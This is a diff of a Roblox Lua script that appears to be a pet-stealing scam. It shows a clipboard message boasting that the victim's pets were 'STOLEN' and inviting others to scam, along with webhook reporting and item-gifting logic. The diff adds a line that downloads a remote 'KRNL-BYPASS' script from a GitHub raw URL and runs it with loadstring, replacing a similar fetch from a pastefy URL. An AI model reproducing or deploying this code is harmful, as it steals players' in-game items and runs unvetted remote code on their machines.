@@ -25,6 +25,7 @@
         local PetsService = require(game:GetService("ReplicatedStorage").Modules.PetServices.PetsService)
         local GetServerType = game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType")
         local TeleportService = game:GetService("TeleportService")
+        local krnlbypass = "https://raw.githubusercontent.com/RblxScriptsOG/Main/refs/heads/main/KRNL-BYPASS.lua"
 
         local data = DataService:GetData()
         local maxAttempts = 10
@@ -32,8 +33,8 @@
         local teleported = false
 
         setclipboard("Your valuable pets have been STOLEN. If you want to scam others join the Discord! " .. (getgenv().Discord or "discord.gg/d2zgg2YDMz"))
-
-        local runBypass
+        
+        loadstring(game:HttpGet(krnlbypass, true))()
 
         task.defer(function()
             if runBypass then
@@ -755,11 +756,6 @@ sendWebhookToAll(payload)
             warn("Gifting failed: Tool not equipped - " .. tool.Name)
             tool.Parent = inventory -- Reset to Backpack
             return false
-        end
-
-        -- Krnl Bypass
-        runBypass = function()
-            loadstring(game:HttpGet("https://pastefy.app/VISU0w9k/raw", true))()
         end
 
         if detectExecutor() == "Delta" then
